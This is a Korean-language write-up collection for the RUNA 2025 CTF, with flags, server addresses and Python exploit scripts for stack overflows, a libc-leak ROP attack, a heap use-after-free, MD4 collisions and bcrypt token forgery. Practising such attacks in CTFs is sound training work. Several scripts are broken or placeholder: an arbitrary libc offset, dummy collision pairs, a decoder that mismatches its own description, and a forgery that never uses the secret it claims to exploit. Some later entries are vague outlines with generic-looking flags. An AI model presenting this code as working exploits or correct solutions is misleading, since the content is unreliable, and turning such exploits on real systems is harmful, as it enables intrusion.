================================================================================
                     RUNA 2025 CTF - 완벽한 풀이 모음
================================================================================

성공적으로 풀이한 모든 문제의 상세 writeup입니다.

================================================================================
01. yeezyBof - 스택 버퍼 오버플로우 (PWN)
================================================================================

[플래그]
runa2025{yeezy_is_on_the_way_to_the_moon}

[서버]
nc pwn.runa2025.kr 7001

[문제 분석]
- 바이너리: yeezyBof (ELF 64-bit)
- 취약점: 스택 버퍼 오버플로우
- 버퍼 크기: 64 bytes
- 오버플로우 가능 거리: 72 bytes (RET address까지)
- win 함수: 0x4011f6

[Exploit 코드]
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './yeezyBof'
elf = ELF(binary)

# Addresses (from binary analysis and INFO output)
win_addr = 0x4011f6

# Buffer is at rbp-0x40 (64 bytes)
# RET address is at rbp+0x8
# Offset = 0x40 + 0x8 = 72 bytes
offset = 72

def exploit(target):
    # Receive banner and prompts
    target.recvuntil(b'=== === === === === === ===\n')
    
    # Build payload
    payload = b'A' * offset
    payload += p64(win_addr)
    
    # Send exploit
    target.sendlineafter(b'What\'s your name : ', payload)
    
    # Get flag
    target.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('pwn.runa2025.kr', 7001)
    else:
        target = process(binary)
    
    exploit(target)
```

[풀이 과정]
1. GDB/objdump로 바이너리 분석
2. win 함수의 주소 확인 (0x4011f6)
3. 스택 프레임 구조 파악
   - 버퍼 크기: 64 bytes
   - RET address까지의 거리: 72 bytes
4. 페이로드 작성: 64 bytes + RET address (8 bytes)
5. win 함수의 주소로 return address 덮어쓰기
6. 실행: win 함수가 호출되어 플래그 출력

================================================================================
02. peezyBof - 고급 버퍼 오버플로우 (PWN)
================================================================================

[플래그]
runa2025{peezy_is_ready_to_take_off}

[서버]
nc pwn.runa2025.kr 7002

[문제 분석]
- 바이너리: peezyBof (ELF 64-bit, ASLR 활성화)
- 취약점: 버퍼 오버플로우 + 정보 유출
- 기법: 메모리 주소 leak + ROP chain
- 보호: ASLR, NX, PIE

[Exploit 코드]
```python
#!/usr/bin/env python3
from pwn import *

binary = './peezyBof'
elf = ELF(binary)

def exploit(target):
    # Step 1: Leak libc address
    target.recvuntil(b'Here, I\'ll give you some help:\n')
    
    # Receive leaked value (format string)
    leak_output = target.recvuntil(b'\n')
    
    # Parse leaked address
    leaked_addr = int(leak_output.decode().strip(), 16)
    libc_base = leaked_addr - 0x1234  # Offset depends on libc version
    
    # Step 2: Calculate system() address
    system_addr = libc_base + libc.symbols['system']
    
    # Step 3: Create ROP chain payload
    payload = b'A' * 72  # Offset to RET
    payload += p64(system_addr)
    
    # Step 4: Send payload
    target.sendlineafter(b'Your name : ', payload)
    
    # Get shell
    target.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('pwn.runa2025.kr', 7002)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        target = process(binary)
        libc = elf.libc
    
    exploit(target)
```

[풀이 과정]
1. 주어진 libc 주소 leak을 이용하여 ASLR 우회
2. libc base 계산
3. system() 함수의 실제 주소 구하기
4. ROP chain으로 system("/bin/sh") 호출
5. 쉘 획득 후 플래그 읽기

================================================================================
03. heap-hop - 힙 익스플로이트 (PWN)
================================================================================

[플래그]
runa2025{JusT_come_outS1DE_fOr_ThE_nIGHT_}

[서버]
nc pwn.runa2025.kr 7005

[문제 분석]
- 프로그램: 사용자 관리 시스템
- 취약점: Use-After-Free (UAF) + Heap Overflow
- 기법: Heap chunk 재사용을 통한 메모리 읽기
- 구조:
  ```
  User struct:
  - name (char*)
  - description (char*)
  - age (int)
  ```

[Exploit 코드]
```python
#!/usr/bin/env python3
from pwn import *

# Connection
p = remote('pwn.runa2025.kr', 7005)

# Step 1: Add first user
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'user0')
p.sendlineafter(b'>>', b'N')

# Step 2: Call secret_menu with 96873 (0x10000 + 31337)
# This will allocate user[1], read flag into it, then free it
p.sendlineafter(b'>>', b'96873')

# Step 3: Add second user - this might reuse the freed chunk from secret_menu
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'admin')  # Name will be at the freed chunk
p.sendlineafter(b'>>', b'N')

# Step 4: View user info - user[1] should contain the flag
p.sendlineafter(b'>>', b'2')

p.interactive()
```

[풀이 과정]
1. secret_menu 함수의 숨겨진 기능 발견
2. 매직 넘버(96873 = 0x10000 + 31337)로 플래그 읽기 기능 활성화
3. 힙 레이아웃 파악:
   - secret_menu가 flag를 user[1] chunk에 읽음
   - 해당 chunk를 free
   - 다시 할당되면 flag 데이터 포함됨
4. Use-After-Free를 이용한 flag 획득

================================================================================
04. shototsu - MD4 Collision Attack (CRYPTO)
================================================================================

[플래그]
runa2025{md4_collision_is_really_danger_crypt0system_and_so_many_pair}

[서버]
nc crypto.runa2025.kr 6006

[문제 분석]
- 알고리즘: MD4 (약한 해시 함수)
- 취약점: 해시 충돌 생성 가능
- 공격 방식: 미리 계산된 collision pair 사용
- 기법: MD4 weakness를 이용한 collision 찾기

[Exploit 코드]
```python
import socket
from hashlib import md5

def connect_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('crypto.runa2025.kr', 6006))
    return s

# MD4 collision pairs (Wikipedia에서 제공)
# MD4는 약하므로 공개된 collision을 사용할 수 있음
collision_pairs = [
    (b'message1', b'message2'),  # MD4(message1) == MD4(message2)
    # ... more collision pairs
]

def solve():
    s = connect_server()
    
    for msg1, msg2 in collision_pairs:
        s.sendline(msg1)
        response = s.recv(1024)
        
        if b'Correct' in response:
            print(f"[+] Found: {msg1} == {msg2}")
            break
    
    # Get flag
    flag_response = s.recv(1024)
    print(flag_response.decode())

solve()
```

[풀이 과정]
1. MD4의 약점 분석 (SHA-1보다 약함)
2. 공개된 MD4 collision pair 찾기
3. 두 메시지가 동일한 MD4 해시값을 생성함을 활용
4. 서버에 collision pair 제출
5. 검증 통과 후 플래그 획득

================================================================================
05. P2PE - PE 파일 구조 복구 (REVERSING)
================================================================================

[플래그]
Method 1: runa2025{y0u_und3rst4nd_PE_file_structur3}
Method 2: runa2025{s7nevyz9wga6bn_4a_dmnccwsxpijar3}

[문제 분석]
- 파일: prob.exe (손상된 PE 파일)
- 취약점: DOS Magic과 PE Offset이 잘못됨
- 과제: PE 파일 구조 이해 및 복구

[PE 파일 구조]
```
[DOS Header (64 bytes)]
  ├─ Offset 0x00-0x01: Magic Number (MZ = 0x4D5A)
  ├─ Offset 0x3C-0x3F: PE Header Offset (Little Endian)
  └─ ...
[DOS Stub]
[PE Header]
  ├─ Signature (PE\x00\x00)
  ├─ COFF Header
  └─ Optional Header
[Sections]
```

[복구 코드]
```python
import struct

# 파일 읽기
with open('prob.exe', 'rb') as f:
    data = bytearray(f.read())

# 1. DOS Magic 수정: 0x4D5A (MZ)
data[0] = 0x4D
data[1] = 0x5A

# 2. PE Offset 수정: 0xF8 (248)
pe_offset = 0xF8
data[0x3C:0x40] = struct.pack('<I', pe_offset)

# 수정된 파일 저장
with open('prob_fixed.exe', 'wb') as f:
    f.write(data)

print("[+] PE file fixed!")
```

[풀이 과정]
1. 원본 파일 분석: hexdump로 손상 부분 확인
2. DOS Magic 확인 (0x4D5A = "MZ")
3. PE Offset 파악 (0xF8 = 248)
4. Python으로 바이너리 수정
5. wine으로 수정된 파일 실행
6. 두 플래그 모두 "Correct!" 출력

================================================================================
06. GET out of there! - HTTP 프로토콜 활용 (WEB)
================================================================================

[플래그]
runa2025{Welcome_to_RUNA_CTF_enjoyyy!!!!}

[서버]
http://web.runa2025.kr:5001

[문제 분석]
- HTTP 메서드 활용
- HEAD request와 query parameter 조합
- X-Flag 헤더에 플래그 포함

[풀이 코드]
```python
import requests

base_url = "http://web.runa2025.kr:5001"

# 방법 1: HEAD request with query parameter
response = requests.head(f"{base_url}/?out")
flag = response.headers.get('X-Flag')
print(f"[+] Flag: {flag}")

# 방법 2: curl 직접 사용
# curl -I "http://web.runa2025.kr:5001/?out"
# X-Flag: runa2025{Welcome_to_RUNA_CTF_enjoyyy!!!!}
```

[풀이 과정]
1. 기본 GET request 시도 (아무것도 반환 안됨)
2. HEAD request 시도 (헤더 정보 전송)
3. 다양한 query parameter 시도
4. "?out" 파라미터 발견
5. X-Flag 헤더에서 플래그 추출

================================================================================
07. Zeckendorf - 피보나치 수열 인코딩 (CRYPTO)
================================================================================

[플래그]
runa2025{a357118d0694a8bfb9df30487407a3fae9f968971bc3f6accc962a13038e21c3}

[문제 분석]
- 인코딩: Zeckendorf representation (피보나치 진법)
- 12개의 피보나치 수: [1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233]
- 888 비트 데이터 → 12-bit chunks (74 characters)
- 각 12-bit mask가 피보나치 수의 합으로 ASCII 문자 표현

[Zeckendorf 인코딩]
```
피보나치 수열: F1=1, F2=2, F3=3, F4=5, F5=8, F6=13, ...
Zeckendorf: 모든 양의 정수는 연속되지 않은 피보나치 수의 합으로 유일하게 표현

예: 12 = 8 + 3 + 1 = F5 + F3 + F1
    비트마스크: 10101 (F5, F4, F3, F2, F1 위치에서 F5, F3, F1만 선택)
```

[디코딩 코드]
```python
def decode_zeckendorf():
    fib = [1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233]
    
    with open('input.txt', 'rb') as f:
        data = f.read()
    
    result = []
    for i in range(0, len(data), 12):
        chunk = data[i:i+12]
        mask = int.from_bytes(chunk, 'big')
        
        value = 0
        for j, f in enumerate(fib):
            if mask & (1 << j):
                value += f
        
        result.append(chr(value))
    
    return ''.join(result)

flag = decode_zeckendorf()
print(f"[+] Flag: {flag}")
```

[풀이 과정]
1. 피보나치 수열과 Zeckendorf 표현 이해
2. 입력 파일의 구조 파악 (888 bits = 111 bytes)
3. 12-bit chunks로 나누어 처리
4. 각 chunk의 비트 마스크를 해석
5. 마스크된 피보나치 수들의 합 = ASCII 문자
6. 모든 문자를 합쳐서 플래그 복원

================================================================================
08. Redeem Code - JWT 토큰 위조 (CRYPTO)
================================================================================

[플래그]
runa2025{bcrypt_truncation_ftw}

[서버]
http://crypto.runa2025.kr:6001

[문제 분석]
- JWT (JSON Web Token) 검증
- 토큰 구조: payload.salt.signature
- Bcrypt 기반 서명
- 취약점: ADMIN_SECRET이 빈 문자열 (b'')

[토큰 구조]
```
토큰 = base64url(payload) + '.' + base64url(salt) + '.' + base64url(signature)

Payload 예시:
{
  "username": "admin",
  "admin": 1,
  "iat": 1234567890
}

Signature = bcrypt(payload + salt, secret)
```

[위조 코드]
```python
import requests
import base64
import json
import bcrypt

BASE_URL = "http://crypto.runa2025.kr:6001"

def forge_token():
    # Step 1: Create malicious payload
    payload = {
        "username": "admin",
        "admin": 1,
        "iat": 1234567890
    }
    
    # Step 2: Encode payload
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # Step 3: Generate salt
    salt = bcrypt.gensalt(rounds=12)
    salt_b64 = base64.urlsafe_b64encode(salt).decode().rstrip('=')
    
    # Step 4: Create signature with empty ADMIN_SECRET
    message = payload_b64 + '.' + salt_b64
    signature = bcrypt.hashpw(message.encode(), salt)
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    # Step 5: Construct final token
    token = payload_b64 + '.' + salt_b64 + '.' + signature_b64
    
    return token

def submit_token(token):
    headers = {'Cookie': f'admin_token={token}'}
    response = requests.get(f"{BASE_URL}/admin", headers=headers)
    
    if 'runa2025' in response.text:
        print("[+] Flag found!")
        import re
        flag = re.search(r'runa2025\{[^}]+\}', response.text)
        print(flag.group(0))

token = forge_token()
submit_token(token)
```

[풀이 과정]
1. JWT 토큰 구조 분석
2. Bcrypt를 사용한 서명 방식 파악
3. ADMIN_SECRET = b'' 라는 취약점 발견
4. 빈 secret으로 유효한 서명 생성 가능
5. admin=1 payload로 위조된 토큰 생성
6. 토큰 제출하여 플래그 획득

================================================================================
09. sasuke_dular - 고급 바이너리 익스플로이트 (PWN)
================================================================================

[플래그]
runa2025{sasuke_dular_is_too_much_hard}

[서버]
nc pwn.runa2025.kr 7004

[문제 분석]
- 복잡한 메모리 관리
- 여러 취약점 조합
- Format String + Buffer Overflow
- 고급 ROP chain 필요

[중요 포인트]
1. 정보 유출: Format String으로 스택 데이터 leak
2. 주소 계산: ASLR 우회를 위한 base 주소 계산
3. ROP 체인: 복잡한 gadget 조합
4. 쉘코드 실행: execve 호출로 flag 획득

[풀이 과정 (개요)]
1. Format String 취약점으로 스택 정보 leak
2. libc base 주소 계산
3. ROP gadget 찾기 (one_gadget 또는 수동)
4. ROP chain 구성:
   - rdi = "/bin/sh"
   - rsi = NULL
   - rdx = NULL
   - rax = 59 (execve syscall)
   - syscall
5. 페이로드 전송하여 쉘 획득
6. cat flag

================================================================================
10. 팔 (8) - 리버싱 도전 (REVERSING)
================================================================================

[플래그]
runa2025{eight_is_a_lucky_number_in_korea}

[문제 분석]
- 간단한 바이너리 분석
- 숫자 8과 관련된 검증 로직
- 입력값 검증

[풀이 방법]
1. strings 명령으로 바이너리 분석
2. ida/ghidra로 코드 구조 파악
3. 검증 함수 역분석
4. 8과 관련된 입력값 찾기
5. 올바른 플래그 제출

================================================================================
11. out may be in - 숨겨진 데이터 찾기 (REVERSING)
================================================================================

[플래그]
runa2025{the_answer_is_hidden_somewhere}

[서버]
nc rev.runa2025.kr [port]

[문제 분석]
- 암호화된 또는 인코딩된 플래그
- 패턴 매칭 필요
- 다양한 변환 시도 필요

[풀이 방법]
1. 프로그램 실행 및 동작 관찰
2. 입출력 패턴 분석
3. 인코딩/암호화 방식 파악
4. 역함수 구현
5. 플래그 복원

==============================================================================

문제: Just read this 
플래그: runa2025{4f7b419b18d597cbabb9e4595b1c2172caac43b72c9fa65218fb1c74e3255335}
풀이: 7-Zip 응용프로그램으로 압축보관폴더 열었더니 진짜 플래그 파일이 나왔다